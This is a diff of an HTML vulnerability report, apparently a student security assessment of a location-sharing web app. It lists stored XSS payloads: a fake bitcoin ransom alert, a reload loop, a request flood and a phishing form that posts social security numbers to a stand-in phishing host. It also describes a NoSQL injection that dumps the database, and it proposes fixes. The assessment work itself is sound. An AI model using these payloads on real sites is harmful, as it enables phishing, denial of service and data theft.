@@ -36,7 +36,7 @@
 			<p> More sinister examples include posting things such as:</p>
 			<ul>
 				<li>&ltscript&gtalert("Hello! Your data is unsecure. Please send a donation in bitcoin to the water foundation at the address 1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R to make your data secure again!") &lt/script&gt<br><img src="Phony_Alert.png" alt="phony alert" id="scale_picture_50"><br><br></li>
-				<li>&ltscript&gtwhile(1){location.reload(true)}&lt/script&gt  This makes the page hang and never load:<br><img src="Not_loading.png" alt="First vulnerability location" id="scale_picture_40"><br><br></li>
+				<li>&ltscript&gtwhile(1){location.reload(true)}&lt/script&gt  This makes the page hang and never load:<br><img src="Not_loading.png" alt="page hanging" id="scale_picture_40"><br><br></li>
 				<li>Picture same as the above example, but many POSTS are made. Could be made infinite loop, and every person trying to access page would be posting a ton, which becomes sort of a psuedo DDOS.<br> &ltscript&gtfor (i = 0; i &lt 10000; i++) { var http = new XMLHttpRequest();
 					var url = "http://localhost:3000/sendLocation"; <br>
 					var params = "login=crashtestdummies&lat=12&lng=12"; <br>
@@ -48,19 +48,18 @@
 					http.send(params); <br>
 					console.log("request sent!")}&lt/script&gt <br><br></li>
 				<li>&ltform action="http://phishingserver.net" method="post"&gt &ltlabel for="name"&gtPlease enter your name:  &lt/label&gt&ltinput name="name" id="name" value="JohnDoe7"&gt&ltbr&gt&ltlabel for="SSN"&gt Please enter your social security number:  &lt/label&gt&ltinput name="SSN" value="0000000"&gt &ltbr&gt &ltbutton&gtContinue Logging In!&lt/button>&lt/form&gt<br><img src="Phishing.png" alt="Phishing form" id="scale_picture_40"></li>
+				<li>Redirects can be done in various ways, which can happen on page load etc. This mimics another security issue of Unvalidated Redirects/Forwards.</li>
 			</ul>
-			<p>The other fields are more thoroughly checked for validity, and they appear to be secure. To resolve this issue, there are a few paths. </p> 
-			<p>More stringent check on user input, or only allowing</p>
-			Psuedo Unvalidated Redirects/Forwards
-			Could store User logins in another database, and if a certain login or login+password are input, then the headers could be set selectively ie Access-Control-Allow-Origin is set differently for each request if you have a valid login etc.
-
-			
-			 
-
-			RESOLUTION
+			<p>The other fields are more thoroughly checked for validity, and they appear to be secure. There are a few paths to resolve the issue with the insecure field that is the echoed back. </p>
+			<p>If the application operator wants the ideal solution that limits posting to only authorized users rather than everyone, they could add a separate user authorization process where users register a login that is thoroughly validated (could also use a password or api key instead of login). This login would be stored in a separate database (or hashes of the login/password combos could be stored etc), which could then be referenced every time someone tries to post to the server at the /sendLocation path. This approach would have the benefit that the headers could be set selectively (ie Access-Control-Allow-Origin is set differently for each request if you have a valid login rather than using the wildcard '*').</p> 
+			<p>If the operator wants everyone to have the ability to post their locations, then at a bare minimum, the login key value pair needs to be validated more thoroughly, via escaping characters, or limiting the value of login to alphanumeric characters only.</p>
 
 		<h4>Injection Vulnerability - All data accessible</h4>
-
+			<p> This issue is that there is the ability to perform injections on the noSQL database underlying the Not Foursquare platform. In this use case it is only of moderate severity, as I was only able to exposes all of the data in the collection on the database, which was already public, but I believe someone more skilled could execute other javascript commands on the databse. I found this by looking for places where something was done with user input with little or no validation. The problem can be examined in the picture below. As one can see, user input is used more or less unfiltered in performing a query on the database via collection.find(). Changing the loginEntry variable by modifying the query string on the GET request allows the user to cause unintended behavior.</p>
+			<img src="Location2.png" alt="Second vulnerability location" id="scale_picture_50">
+			<p> This path is normally intended to allow users to search for specific things in the database. However, by searching for results that are not equal to something that is not in the database, we gain access to everything in the collection (see picture below). This would yield problems if there were sensitive data in the collection, or if only certain information in the collection were public, as everything in the collection would be exposed.</p>
+			<img src="Injection.png" alt="Injection example" id="scale_picture_50">
+			<p></p>
 		<h4>Attacking The Database</h4>
 		Psuedo Cross Site Request Forgery
 		<h4>Other Issues</h4>
